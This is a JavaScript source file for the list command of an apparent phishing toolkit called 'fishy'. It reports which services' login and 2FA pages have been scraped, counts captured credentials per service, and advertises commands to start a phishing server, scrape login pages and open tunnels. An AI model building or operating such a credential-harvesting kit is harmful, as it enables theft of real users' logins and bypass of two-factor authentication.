import { listServices } from '../lib/service-registry.js';
import { captureStore } from '../lib/capture.js';
import { printBanner } from '../lib/ui.js';
import chalk from 'chalk';

export function listCommand() {
  printBanner();

  const services = listServices();

  console.log(chalk.gray('  ─────────────────────────────────────────────'));
  console.log(chalk.white('  📦 Scraped Pages'));
  console.log(chalk.gray('  ─────────────────────────────────────────────'));

  if (services.length === 0) {
    console.log(chalk.gray('  No services defined.'));
  } else {
    services.forEach(s => {
      const status = s.scraped
        ? chalk.green('✓ login') + (s.twofaScraped ? ' ' + chalk.magenta('✓ 2fa') : '')
        : chalk.gray('— not scraped');
      console.log(`  ${chalk.cyan(s.id.padEnd(15))} ${status}`);
    });
  }

  console.log();

  // Captures summary
  const creds = captureStore.getAll();
  console.log(chalk.gray('  ─────────────────────────────────────────────'));
  console.log(chalk.white('  🎣 Captures'));
  console.log(chalk.gray('  ─────────────────────────────────────────────'));
  console.log(`  ${chalk.white('Total:')}    ${chalk.yellow(creds.length)}`);

  const byService = captureStore.byService();
  if (Object.keys(byService).length > 0) {
    console.log(`  ${chalk.white('By service:')}`);
    Object.entries(byService).forEach(([svc, count]) => {
      console.log(`    ${chalk.cyan(svc.padEnd(15))} ${chalk.white(count)}`);
    });
  }

  console.log();
  console.log(chalk.gray('  Commands:'));
  console.log(chalk.gray('    fishy serve <service>    Start phishing server'));
  console.log(chalk.gray('    fishy scrape <service>   Scrape a login page'));
  console.log(chalk.gray('    fishy tunnel <type>      Start a tunnel'));
  console.log();
}
